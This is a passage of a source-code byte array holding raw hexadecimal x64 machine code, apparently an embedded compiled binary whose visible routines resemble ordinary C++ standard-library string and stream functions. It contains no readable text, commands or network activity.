0xC0, 0x0F, 0x84, 0x84, 0x00, 0x00, 0x00, 0x48, 0x8D,	0x70, 0x27, 0x48, 0x83, 0xE6, 0xE0, 0x48, 0x89, 0x46, 0xF8, 0xEB, 0x11,	0x48, 0x85, 0xC9, 0x74, 0x0A, 0xE8, 0x2A, 0x0C, 0x00, 0x00, 0x48, 0x8B,	0xF0, 0xEB, 0x02, 0x33, 0xF6, 0x4D, 0x8B, 0xC6, 0x4C, 0x89, 0x73, 0x10,	0x49, 0x8B, 0xD7, 0x48, 0x89, 0x7B, 0x18, 0x48, 0x8B, 0xCE, 0xE8, 0xF0,	0x1A, 0x00, 0x00, 0x41, 0xC6, 0x04, 0x36, 0x00, 0x48, 0x83, 0xFD, 0x10,	0x72, 0x2D, 0x48, 0x8B, 0x0B, 0x48, 0x8D, 0x55, 0x01, 0x48, 0x81, 0xFA,	0x00, 0x10, 0x00, 0x00, 0x72, 0x18, 0x4C, 0x8B, 0x41, 0xF8, 0x48, 0x83,	0xC2, 0x27, 0x49, 0x2B, 0xC8, 0x48, 0x8D, 0x41, 0xF8, 0x48, 0x83, 0xF8,	0x1F, 0x77, 0x1F, 0x49, 0x8B, 0xC8, 0xE8, 0xA1, 0x0B, 0x00, 0x00, 0x48,	0x89, 0x33, 0x48, 0x8B, 0xC3, 0x48, 0x8B, 0x74, 0x24, 0x68, 0x48, 0x83,	0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5E, 0x5F, 0x5D, 0x5B, 0xC3, 0xFF, 0x15,	0x98, 0x21, 0x00, 0x00, 0xCC, 0xE8, 0x7A, 0xE0, 0xFF, 0xFF, 0xCC, 0xE8,	0x14, 0xE1, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x74, 0x24,	0x10, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0xF9, 0x49, 0x8B, 0xF0,	0x48, 0x8B, 0x49, 0x10, 0x4C, 0x8B, 0x47, 0x18, 0x49, 0x8B, 0xC0, 0x48,	0x2B, 0xC1, 0x48, 0x3B, 0xF0, 0x77, 0x3F, 0x48, 0x89, 0x5C, 0x24, 0x40,	0x48, 0x8D, 0x04, 0x31, 0x48, 0x89, 0x47, 0x10, 0x48, 0x8B, 0xC7, 0x49,	0x83, 0xF8, 0x10, 0x72, 0x03, 0x48, 0x8B, 0x07, 0x48, 0x8D, 0x1C, 0x08,	0x4C, 0x8B, 0xC6, 0x48, 0x8B, 0xCB, 0xE8, 0x46, 0x1A, 0x00, 0x00, 0xC6,	0x04, 0x33, 0x00, 0x48, 0x8B, 0xC7, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48,	0x8B, 0x74, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0x4C, 0x8B,	0xCA, 0x48, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8B, 0xD6, 0x48, 0x8B, 0xCF,	0xE8, 0x2B, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x74, 0x24, 0x48, 0x48, 0x83,	0xC4, 0x30, 0x5F, 0xC3, 0x48, 0x89, 0x5C, 0x24, 0x18, 0x48, 0x89, 0x54,	0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x56, 0x57, 0x41, 0x56, 0x48,	0x83, 0xEC, 0x30, 0x48, 0x8B, 0xF1, 0x33, 0xDB, 0x89, 0x5C, 0x24, 0x58,	0x48, 0x8B, 0x09, 0x48, 0x63, 0x41, 0x04, 0x48, 0x8B, 0x7C, 0x30, 0x28,	0x48, 0x83, 0xFF, 0x6D, 0x7C, 0x06, 0x48, 0x83, 0xC7, 0x94, 0xEB, 0x02,	0x33, 0xFF, 0x4C, 0x8B, 0xF6, 0x48, 0x89, 0x74, 0x24, 0x20, 0x4C, 0x8B,	0x44, 0x30, 0x48, 0x48, 0x8B, 0xD1, 0x4D, 0x85, 0xC0, 0x74, 0x0F, 0x49,	0x8B, 0x00, 0x49, 0x8B, 0xC8, 0xFF, 0x50, 0x08, 0x48, 0x8B, 0x0E, 0x48,	0x8B, 0xD1, 0x48, 0x63, 0x41, 0x04, 0x83, 0x7C, 0x30, 0x10, 0x00, 0x74,	0x04, 0x32, 0xC0, 0xEB, 0x2E, 0x48, 0x8B, 0x44, 0x30, 0x50, 0x48, 0x85,	0xC0, 0x74, 0x22, 0x48, 0x3B, 0xC6, 0x74, 0x1D, 0x48, 0x8B, 0xC8, 0xFF,	0x15, 0x8B, 0x1F, 0x00, 0x00, 0x48, 0x8B, 0x0E, 0x48, 0x63, 0x41, 0x04,	0x83, 0x7C, 0x30, 0x10, 0x00, 0x0F, 0x94, 0xC0, 0x48, 0x8B, 0xD1, 0xEB,	0x02, 0xB0, 0x01, 0x88, 0x44, 0x24, 0x28, 0x84, 0xC0, 0x75, 0x0A, 0xBB,	0x04, 0x00, 0x00, 0x00, 0xE9, 0xB2, 0x00, 0x00, 0x00, 0x48, 0x63, 0x41,	0x04, 0x8B, 0x4C, 0x30, 0x18, 0x81, 0xE1, 0xC0, 0x01, 0x00, 0x00, 0x83,	0xF9, 0x40, 0x74, 0x29, 0x48, 0x85, 0xFF, 0x7E, 0x21, 0x48, 0x8B, 0x06,	0x48, 0x63, 0x48, 0x04, 0x0F, 0xB6, 0x54, 0x31, 0x58, 0x48, 0x8B, 0x4C,	0x31, 0x48, 0xFF, 0x15, 0x54, 0x1E, 0x00, 0x00, 0x83, 0xF8, 0xFF, 0x74,	0x55, 0x48, 0xFF, 0xCF, 0xEB, 0xDA, 0x48, 0x8B, 0x16, 0x48, 0x63, 0x42,	0x04, 0x41, 0xB8, 0x6C, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x96, 0x22,	0x00, 0x00, 0x48, 0x8B, 0x4C, 0x30, 0x48, 0xFF, 0x15, 0x63, 0x1E, 0x00,	0x00, 0x48, 0x83, 0xF8, 0x6C, 0x75, 0x2B, 0x0F, 0x1F, 0x44, 0x00, 0x00,	0x48, 0x85, 0xFF, 0x7E, 0x2A, 0x48, 0x8B, 0x06, 0x48, 0x63, 0x48, 0x04,	0x0F, 0xB6, 0x54, 0x31, 0x58, 0x48, 0x8B, 0x4C, 0x31, 0x48, 0xFF, 0x15,	0x04, 0x1E, 0x00, 0x00, 0x83, 0xF8, 0xFF, 0x74, 0x05, 0x48, 0xFF, 0xCF,	0xEB, 0xDA, 0xBB, 0x04, 0x00, 0x00, 0x00, 0x89, 0x5C, 0x24, 0x58, 0x48,	0x8B, 0x06, 0x48, 0x63, 0x48, 0x04, 0x48, 0xC7, 0x44, 0x31, 0x28, 0x00,	0x00, 0x00, 0x00, 0xEB, 0x0E, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x8B, 0x5C,	0x24, 0x58, 0x4C, 0x8B, 0x74, 0x24, 0x20, 0x48, 0x8B, 0x06, 0x48, 0x63,	0x48, 0x04, 0x48, 0x03, 0xCE, 0x45, 0x33, 0xC0, 0x8B, 0xD3, 0xFF, 0x15,	0x04, 0x1E, 0x00, 0x00, 0x90, 0xFF, 0x15, 0x85, 0x1E, 0x00, 0x00, 0x84,	0xC0, 0x75, 0x0A, 0x49, 0x8B, 0xCE, 0xFF, 0x15, 0x80, 0x1E, 0x00, 0x00,	0x90, 0x49, 0x8B, 0x06, 0x48, 0x63, 0x48, 0x04, 0x4A, 0x8B, 0x4C, 0x31,	0x48, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x48, 0x8B, 0x01, 0xFF, 0x50, 0x10,	0x90, 0x48, 0x8B, 0xC6, 0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x83, 0xC4,	0x30, 0x41, 0x5E, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24,	0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x40, 0x48,	0x8B, 0x05, 0xAA, 0x4C, 0x00, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89, 0x44,	0x24, 0x38, 0x48, 0x8B, 0xF1, 0x33, 0xD2, 0x48, 0x8D, 0x4C, 0x24, 0x28,	0xFF, 0x15, 0xEA, 0x1D, 0x00, 0x00, 0x90, 0x48, 0x8B, 0x05, 0x3A, 0x55,	0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x0D, 0xF6, 0x1D,	0x00, 0x00, 0xFF, 0x15, 0xC0, 0x1D, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x48,	0x8B, 0x46, 0x08, 0x48, 0x3B, 0x78, 0x18, 0x73, 0x0F, 0x48, 0x8B, 0x48,	0x10, 0x48, 0x8B, 0x1C, 0xF9, 0x48, 0x85, 0xDB, 0x75, 0x68, 0xEB, 0x02,	0x33, 0xDB, 0x80, 0x78, 0x24, 0x00, 0x74, 0x14, 0xFF, 0x15, 0xB6, 0x1D,	0x00, 0x00, 0x48, 0x3B, 0x78, 0x18, 0x73, 0x0D, 0x48, 0x8B, 0x40, 0x10,	0x48, 0x8B, 0x1C, 0xF8, 0x48, 0x85, 0xDB, 0x75, 0x45, 0x48, 0x8B, 0x5C,	0x24, 0x20, 0x48, 0x85, 0xDB, 0x75, 0x3B, 0x48, 0x8B, 0xD6, 0x48, 0x8D,	0x4C, 0x24, 0x20, 0xFF, 0x15, 0xBB, 0x1D, 0x00, 0x00, 0x48, 0x83, 0xF8,	0xFF, 0x74, 0x52, 0x48, 0x8B, 0x5C, 0x24, 0x20, 0x48, 0x89, 0x5C, 0x24,	0x30, 0x48, 0x8B, 0xCB, 0xE8, 0x03, 0x08, 0x00, 0x00, 0x48, 0x8B, 0x03,	0x48, 0x8B, 0xCB, 0xFF, 0x50, 0x08, 0x48, 0x8B, 0x5C, 0x24, 0x20, 0x48,	0x89, 0x1D, 0xA6, 0x54, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF,	0x15, 0x4B, 0x1D, 0x00, 0x00, 0x48, 0x8B, 0xC3, 0x48, 0x8B, 0x4C, 0x24,	0x38, 0x48, 0x33, 0xCC, 0xE8, 0x2B, 0x08, 0x00, 0x00, 0x48, 0x8B, 0x5C,	0x24, 0x58, 0x48, 0x8B, 0x74, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x40, 0x5F,	0xC3, 0xE8, 0x26, 0xDE, 0xFF, 0xFF, 0x90, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x40, 0x53, 0x55, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B,	0x69, 0x10, 0x48, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F,	0x48, 0x8B, 0xC3, 0x45, 0x0F, 0xB6, 0xF9, 0x48, 0x2B, 0xC5, 0x48, 0x8B,	0xF1, 0x48, 0x83, 0xF8, 0x01, 0x0F, 0x82, 0x2A, 0x01, 0x00, 0x00, 0x4C,	0x89, 0x64, 0x24, 0x60, 0x4C, 0x8D, 0x65, 0x01, 0x4C, 0x89, 0x74, 0x24,	0x20, 0x4C, 0x8B, 0x71, 0x18, 0x49, 0x8B, 0xCC, 0x48, 0x83, 0xC9, 0x0F,	0x48, 0x3B, 0xCB, 0x77, 0x1F, 0x49, 0x8B, 0xD6, 0x48, 0x8B, 0xC3, 0x48,	0xD1, 0xEA, 0x48, 0x2B, 0xC2, 0x4C, 0x3B, 0xF0, 0x77, 0x0E, 0x4A, 0x8D,	0x04, 0x32, 0x48, 0x8B, 0xD9, 0x48, 0x3B, 0xC8, 0x48, 0x0F, 0x42, 0xD8,	0x48, 0x8B, 0xCB, 0x48, 0x89, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC1, 0x01,	0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x0F, 0x42, 0xC8, 0x48,	0x81, 0xF9, 0x00, 0x10, 0x00, 0x00, 0x72, 0x28, 0x48, 0x8D, 0x41, 0x27,	0x48, 0x3B, 0xC1, 0x0F, 0x86, 0xBA, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8,	0xE8, 0xC7, 0x07, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x76, 0x48, 0x8D,	0x78, 0x27, 0x48, 0x83, 0xE7, 0xE0, 0x48, 0x89, 0x47, 0xF8, 0xEB, 0x11,	0x48, 0x85, 0xC9, 0x74, 0x0A, 0xE8, 0xAA, 0x07, 0x00, 0x00, 0x48, 0x8B,	0xF8, 0xEB, 0x02, 0x33, 0xFF, 0x4C, 0x89, 0x66, 0x10, 0x4C, 0x8B, 0xC5,	0x48, 0x89, 0x5E, 0x18, 0x48, 0x8B, 0xCF, 0x49, 0x83, 0xFE, 0x10, 0x72,	0x4A, 0x48, 0x8B, 0x1E, 0x48, 0x8B, 0xD3, 0xE8, 0x67, 0x16, 0x00, 0x00,	0x49, 0x8D, 0x56, 0x01, 0x44, 0x88, 0x3C, 0x2F, 0xC6, 0x44, 0x2F, 0x01,	0x00, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0x18, 0x48, 0x8B,	0x4B, 0xF8, 0x48, 0x83, 0xC2, 0x27, 0x48, 0x2B, 0xD9, 0x48, 0x8D, 0x43,	0xF8, 0x48, 0x83, 0xF8, 0x1F, 0x77, 0x0D, 0x48, 0x8B, 0xD9, 0x48, 0x8B,	0xCB, 0xE8, 0x1A, 0x07, 0x00, 0x00, 0xEB, 0x18, 0xFF, 0x15, 0x26, 0x1D,	0x00, 0x00, 0xCC, 0x48, 0x8B, 0xD6, 0xE8, 0x20, 0x16, 0x00, 0x00, 0x44,	0x88, 0x3C, 0x2F, 0xC6, 0x44, 0x2F, 0x01, 0x00, 0x48, 0x89, 0x3E, 0x48,	0x8B, 0xC6, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x4C, 0x8B, 0x64, 0x24, 0x60,	0x4C, 0x8B, 0x74, 0x24, 0x20, 0x48, 0x83, 0xC4, 0x28, 0x41, 0x5F, 0x5E,	0x5D, 0x5B, 0xC3, 0xE8, 0xD8, 0xDB, 0xFF, 0xFF, 0xCC, 0xE8, 0x72, 0xDC,	0xFF, 0xFF, 0xCC, 0xCC, 0x40, 0x53, 0x56, 0x41, 0x54, 0x41, 0x55, 0x48,	0x83, 0xEC, 0x38, 0x4C, 0x8B, 0x61, 0x10, 0x48, 0xBB, 0xFF, 0xFF, 0xFF,	0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x48, 0x8B, 0xC3, 0x4D, 0x8B, 0xE9, 0x49,	0x2B, 0xC4, 0x48, 0x8B, 0xF1, 0x48, 0x3B, 0xC2, 0x0F, 0x82, 0x59, 0x01,	0x00, 0x00, 0x48, 0x89, 0x6C, 0x24, 0x70, 0x48, 0x8B, 0x69, 0x18, 0x4C,	0x89, 0x74, 0x24, 0x28, 0x4E, 0x8D, 0x34, 0x22, 0x49, 0x8B, 0xCE, 0x48,	0x83, 0xC9, 0x0F, 0x48, 0x3B, 0xCB, 0x77, 0x1F, 0x48, 0x8B, 0xD5, 0x48,	0x8B, 0xC3, 0x48, 0xD1, 0xEA, 0x48, 0x2B, 0xC2, 0x48, 0x3B, 0xE8, 0x77,	0x0E, 0x48, 0x8D, 0x04, 0x2A, 0x48, 0x8B, 0xD9, 0x48, 0x3B, 0xC8, 0x48,	0x0F, 0x42, 0xD8, 0x48, 0x8B, 0xCB, 0x48, 0x89, 0x7C, 0x24, 0x30, 0x48,	0x83, 0xC1, 0x01, 0x4C, 0x89, 0x7C, 0x24, 0x20, 0x48, 0xC7, 0xC0, 0xFF,	0xFF, 0xFF, 0xFF, 0x48, 0x0F, 0x42, 0xC8, 0x48, 0x81, 0xF9, 0x00, 0x10,	0x00, 0x00, 0x72, 0x2C, 0x48, 0x8D, 0x41, 0x27, 0x48, 0x3B, 0xC1, 0x0F,	0x86, 0xE4, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xE8, 0x63, 0x06, 0x00,	0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x8C, 0x00, 0x00, 0x00, 0x48, 0x8D,	0x78, 0x27, 0x48, 0x83, 0xE7, 0xE0, 0x48, 0x89, 0x47, 0xF8, 0xEB, 0x11,	0x48, 0x85, 0xC9, 0x74, 0x0A, 0xE8, 0x42, 0x06, 0x00, 0x00, 0x48, 0x8B,	0xF8, 0xEB, 0x02, 0x33, 0xFF, 0x4C, 0x8B, 0xBC, 0x24, 0x80, 0x00, 0x00,	0x00, 0x4D, 0x8B, 0xC4, 0x4C, 0x89, 0x76, 0x10, 0x4E, 0x8D, 0x34, 0x27,	0x48, 0x89, 0x5E, 0x18, 0x48, 0x8B, 0xCF, 0x48, 0x83, 0xFD, 0x10, 0x72,	0x54, 0x48, 0x8B, 0x1E, 0x48, 0x8B, 0xD3, 0xE8, 0xF3, 0x14, 0x00, 0x00,	0x4D, 0x8B, 0xC7, 0x49, 0x8B, 0xD5, 0x49, 0x8B, 0xCE, 0xE8, 0xE5, 0x14,	0x00, 0x00, 0x48, 0x8D, 0x55, 0x01, 0x43, 0xC6, 0x04, 0x3E, 0x00, 0x48,	0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0x18, 0x48, 0x8B, 0x4B, 0xF8,	0x48, 0x83, 0xC2, 0x27, 0x48, 0x2B, 0xD9, 0x48, 0x8D, 0x43, 0xF8, 0x48,	0x83, 0xF8, 0x1F, 0x77, 0x0D, 0x48, 0x8B, 0xD9, 0x48, 0x8B, 0xCB, 0xE8,	0x9C, 0x05, 0x00, 0x00, 0xEB, 0x22, 0xFF, 0x15, 0xA8, 0x1B, 0x00, 0x00,	0xCC, 0x48, 0x8B, 0xD6, 0xE8, 0xA2, 0x14, 0x00, 0x00, 0x4D, 0x8B, 0xC7,	0x49, 0x8B, 0xD5, 0x49, 0x8B, 0xCE, 0xE8, 0x94, 0x14, 0x00, 0x00, 0x43,	0xC6, 0x04, 0x3E, 0x00, 0x48, 0x89, 0x3E, 0x48, 0x8B, 0xC6, 0x48, 0x8B,	0x7C, 0x24, 0x30, 0x4C, 0x8B, 0x7C, 0x24, 0x20, 0x48, 0x8B, 0x6C, 0x24,	0x70, 0x4C, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x83, 0xC4, 0x38, 0x41, 0x5D,	0x41, 0x5C, 0x5E, 0x5B, 0xC3, 0xE8, 0x4A, 0xDA, 0xFF, 0xFF, 0xCC, 0xE8,	0xE4, 0xDA, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83,	0xEC, 0x20, 0x48, 0x8B, 0xD9, 0xFF, 0x15, 0x41, 0x1A, 0x00, 0x00, 0x84,	0xC0, 0x75, 0x0A, 0x48, 0x8B, 0x0B, 0xFF, 0x15, 0x3C, 0x1A, 0x00, 0x00,	0x90, 0x48, 0x8B, 0x13, 0x48, 0x8B, 0x02, 0x48, 0x63, 0x48, 0x04, 0x48,	0x8B, 0x4C, 0x11, 0x48, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x48, 0x8B, 0x01,	0xFF, 0x50, 0x10, 0x90, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC,	0x48, 0x8B, 0x09, 0x48, 0x85, 0xC9, 0x74, 0x0B, 0x48, 0x8B, 0x01, 0xBA,	0x01, 0x00, 0x00, 0x00, 0x48, 0xFF, 0x20, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28,	0x48, 0x8B, 0x11, 0x48, 0x8B, 0x02, 0x48, 0x63, 0x48, 0x04, 0x48, 0x8B,	0x4C, 0x11, 0x48, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x48, 0x8B, 0x01, 0xFF,	0x50, 0x10, 0x90, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x7C, 0x24,	0x18, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x30,	0x4D, 0x8B, 0xF0, 0x4C, 0x8B, 0xF9, 0x4C, 0x8B, 0x41, 0x10, 0x49, 0x8B,	0xF9, 0x48, 0x8B, 0x49, 0x18, 0x48, 0x8B, 0xC1, 0x49, 0x2B, 0xC0, 0x4C,	0x3B, 0xC8, 0x0F, 0x87, 0x95, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24,	0x40, 0x4B, 0x8D, 0x04, 0x08, 0x49, 0x89, 0x47, 0x10, 0x49, 0x8B, 0xDF,	0x48, 0x89, 0x74, 0x24, 0x48, 0x48, 0x83, 0xF9, 0x10, 0x72, 0x03, 0x49,	0x8B, 0x1F, 0x4B, 0x8D, 0x04, 0x0E, 0x48, 0x3B, 0xC3, 0x76, 0x1A, 0x4A,	0x8D, 0x04, 0x03, 0x4C, 0x3B, 0xF0, 0x77, 0x11, 0x49, 0x3B, 0xDE, 0x77,	0x04, 0x33, 0xF6, 0xEB, 0x0B, 0x48, 0x8B, 0xF3, 0x49, 0x2B, 0xF6, 0xEB,	0x03, 0x48, 0x8B, 0xF7, 0x49, 0xFF, 0xC0, 0x4A, 0x8D, 0x0C, 0x0B, 0x48,	0x8B, 0xD3, 0xE8, 0x4E, 0x13, 0x00, 0x00, 0x4C, 0x8B, 0xC6, 0x49, 0x8B,	0xD6, 0x48, 0x8B, 0xCB, 0xE8, 0x3A, 0x13, 0x00, 0x00, 0x4C, 0x8B, 0xC7,	0x4A, 0x8D, 0x14, 0x36, 0x4C, 0x2B, 0xC6, 0x48, 0x8D, 0x0C, 0x33, 0x48,	0x03, 0xD7, 0xE8, 0x24, 0x13, 0x00, 0x00, 0x48, 0x8B, 0x74, 0x24, 0x48,	0x49, 0x8B, 0xC7, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x7C, 0x24,	0x50, 0x4C, 0x8B, 0x74, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5F,	0xC3, 0x48, 0x89, 0x7C, 0x24, 0x28, 0x48, 0x8B, 0xD7, 0x49, 0x8B, 0xCF,	0x4C, 0x89, 0x74, 0x24, 0x20, 0xE8, 0xD6, 0x01, 0x00, 0x00, 0x48, 0x8B,	0x7C, 0x24, 0x50, 0x4C, 0x8B, 0x74, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30,	0x41, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24,	0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56,	0x41, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x4D, 0x8B, 0xF8, 0x4C, 0x8B, 0xE2,	0x48, 0x8B, 0xF1, 0x33, 0xDB, 0x89, 0x5C, 0x24, 0x78, 0x48, 0x8B, 0x09,	0x48, 0x63, 0x41, 0x04, 0x48, 0x8B, 0x7C, 0x30, 0x28, 0x48, 0x85, 0xFF,	0x7E, 0x0A, 0x49, 0x3B, 0xF8, 0x76, 0x05, 0x49, 0x2B, 0xF8, 0xEB, 0x02,	0x33, 0xFF, 0x4C, 0x8B, 0xF6, 0x48, 0x89, 0x74, 0x24, 0x20, 0x4C, 0x8B,	0x44, 0x30, 0x48, 0x48, 0x8B, 0xD1, 0x4D, 0x85, 0xC0, 0x74, 0x0F, 0x49,	0x8B, 0x00, 0x49, 0x8B, 0xC8, 0xFF, 0x50, 0x08, 0x48, 0x8B, 0x0E, 0x48,	0x8B, 0xD1, 0x48, 0x63, 0x41, 0x04, 0x83, 0x7C, 0x30, 0x10, 0x00, 0x74,	0x04, 0x32, 0xC0, 0xEB, 0x2E, 0x48, 0x8B, 0x44, 0x30, 0x50, 0x48, 0x85,	0xC0, 0x74, 0x22, 0x48, 0x3B, 0xC6, 0x74, 0x1D, 0x48, 0x8B, 0xC8, 0xFF,	0x15, 0x53, 0x18, 0x00, 0x00, 0x48, 0x8B, 0x0E, 0x48, 0x63, 0x41, 0x04,	0x83, 0x7C, 0x30, 0x10, 0x00, 0x0F, 0x94, 0xC0, 0x48, 0x8B, 0xD1, 0xEB,	0x02, 0xB0, 0x01, 0x88, 0x44, 0x24, 0x28, 0x84, 0xC0, 0x75, 0x0A, 0xBB,	0x04, 0x00, 0x00, 0x00, 0xE9, 0xB3, 0x00, 0x00, 0x00, 0x48, 0x63, 0x41,	0x04, 0x8B, 0x4C, 0x30, 0x18, 0x81, 0xE1, 0xC0, 0x01, 0x00, 0x00, 0x83,	0xF9, 0x40, 0x74, 0x6C, 0x48, 0x85, 0xFF, 0x74, 0x64, 0x48, 0x8B, 0x06,	0x48, 0x63, 0x48, 0x04, 0x0F, 0xB6, 0x54, 0x31, 0x58, 0x48, 0x8B, 0x4C,	0x31, 0x48, 0xFF, 0x15, 0x1C, 0x17, 0x00, 0x00, 0x83, 0xF8, 0xFF, 0x75,	0x43, 0xBB, 0x04, 0x00, 0x00, 0x00, 0x89, 0x5C, 0x24, 0x78, 0x48, 0x85,	0xFF, 0x74, 0x23, 0x48, 0x8B, 0x06, 0x48, 0x63, 0x48, 0x04, 0x0F, 0xB6,	0x54, 0x31, 0x58, 0x48, 0x8B, 0x4C, 0x31, 0x48, 0xFF, 0x15, 0xF2, 0x16,	0x00, 0x00, 0x83, 0xF8, 0xFF, 0x75, 0x42, 0x83, 0xCB, 0x04, 0x89, 0x5C,	0x24, 0x78, 0x48, 0x8B, 0x06, 0x48, 0x63, 0x48, 0x04, 0x48, 0xC7, 0x44,	0x31, 0x28, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x3C, 0x48, 0xFF, 0xCF, 0xEB,	0x97, 0x48, 0x8B, 0x16, 0x48, 0x63, 0x42, 0x04, 0x4D, 0x8B, 0xC7, 0x49,	0x8B, 0xD4, 0x48, 0x8B, 0x4C, 0x30, 0x48, 0xFF, 0x15, 0xEF, 0x16, 0x00,	0x00, 0x49, 0x3B, 0xC7, 0x74, 0xA4, 0xBB, 0x04, 0x00, 0x00, 0x00, 0xEB,	0xC1, 0x48, 0xFF, 0xCF, 0xEB, 0x98, 0x48, 0x8B, 0x74, 0x24, 0x60, 0x8B,	0x5C, 0x24, 0x78, 0x4C, 0x8B, 0x74, 0x24, 0x20, 0x48, 0x8B, 0x06, 0x48,	0x63, 0x48, 0x04, 0x48, 0x03, 0xCE, 0x45, 0x33, 0xC0, 0x8B, 0xD3, 0xFF,	0x15, 0xCB, 0x16, 0x00, 0x00, 0x90, 0xFF, 0x15, 0x4C, 0x17, 0x00, 0x00,	0x84, 0xC0, 0x75, 0x0A, 0x49, 0x8B, 0xCE, 0xFF, 0x15, 0x47, 0x17, 0x00,	0x00, 0x90, 0x49, 0x8B, 0x06, 0x48, 0x63, 0x48, 0x04, 0x4A, 0x8B, 0x4C,	0x31, 0x48, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x48, 0x8B, 0x01, 0xFF, 0x50,	0x10, 0x90, 0x48, 0x8B, 0xC6, 0x48, 0x8B, 0x5C, 0x24, 0x68, 0x48, 0x83,	0xC4, 0x30, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0x5F, 0x5E, 0xC3, 0xCC,	0x40, 0x53, 0x56, 0x41, 0x54, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x28, 0x4C,	0x8B, 0x71, 0x10, 0x48, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,	0x7F, 0x4C, 0x8B, 0x64, 0x24, 0x70, 0x48, 0x8B, 0xC3, 0x49, 0x2B, 0xC6,	0x48, 0x8B, 0xF1, 0x48, 0x3B, 0xC2, 0x0F, 0x82, 0x3E, 0x01, 0x00, 0x00,	0x48, 0x89, 0x6C, 0x24, 0x60, 0x48, 0x8B, 0x69, 0x18, 0x4C, 0x89, 0x7C,	0x24, 0x20, 0x4E, 0x8D, 0x3C, 0x32, 0x49, 0x8B, 0xD7, 0x48, 0x83, 0xCA,	0x0F, 0x48, 0x3B, 0xD3, 0x77, 0x1F, 0x48, 0x8B, 0xCD, 0x48, 0x8B, 0xC3,	0x48, 0xD1, 0xE9, 0x48, 0x2B, 0xC1, 0x48, 0x3B, 0xE8, 0x77, 0x0E, 0x48,	0x8D, 0x04, 0x29, 0x48, 0x8B, 0xDA, 0x48, 0x3B, 0xD0, 0x48, 0x0F, 0x42,	0xD8, 0x48, 0x8B, 0xCB, 0x48, 0x89, 0x7C, 0x24, 0x68, 0x48, 0x83, 0xC1,	0x01, 0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x0F, 0x42, 0xC8,	0x48, 0x81, 0xF9, 0x00, 0x10, 0x00, 0x00, 0x72, 0x2C, 0x48, 0x8D, 0x41,	0x27, 0x48, 0x3B, 0xC1, 0x0F, 0x86, 0xCE, 0x00, 0x00, 0x00, 0x48, 0x8B,	0xC8, 0xE8, 0x96, 0x01, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x82,	0x00, 0x00, 0x00, 0x48, 0x8D, 0x78, 0x27, 0x48, 0x83, 0xE7, 0xE0, 0x48,	0x89, 0x47, 0xF8, 0xEB, 0x11, 